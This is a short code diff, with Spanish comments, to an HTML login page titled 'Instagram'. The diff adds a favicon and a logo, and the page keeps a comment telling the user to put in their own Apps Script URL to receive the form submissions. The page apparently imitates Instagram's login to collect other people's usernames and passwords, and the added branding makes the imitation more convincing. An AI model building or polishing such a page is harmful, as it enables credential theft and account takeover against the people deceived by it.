@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <title>Instagram</title>
+    
+    <!-- Esta es la línea que debes agregar -->
+    <link rel="icon" href="favicon.png" type="image/png">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -47,6 +50,7 @@
 <body>
 
 <div class="login-card">
+    <img src="logo.jpg" alt="Logo" style="display: block; margin: 0 auto 15px auto; width: 50px;">
     <h2>Inicio de Sesión</h2>
     <!-- REEMPLAZA LA URL DE ACTION CON LA TUYA DE APPS SCRIPT -->
     <form id ="loginForm" method="POST">
@@ -69,6 +73,7 @@
       })
       .catch(error => console.error('Error!', error.message));
   });
+  
 </script>
 </body>
 </html>
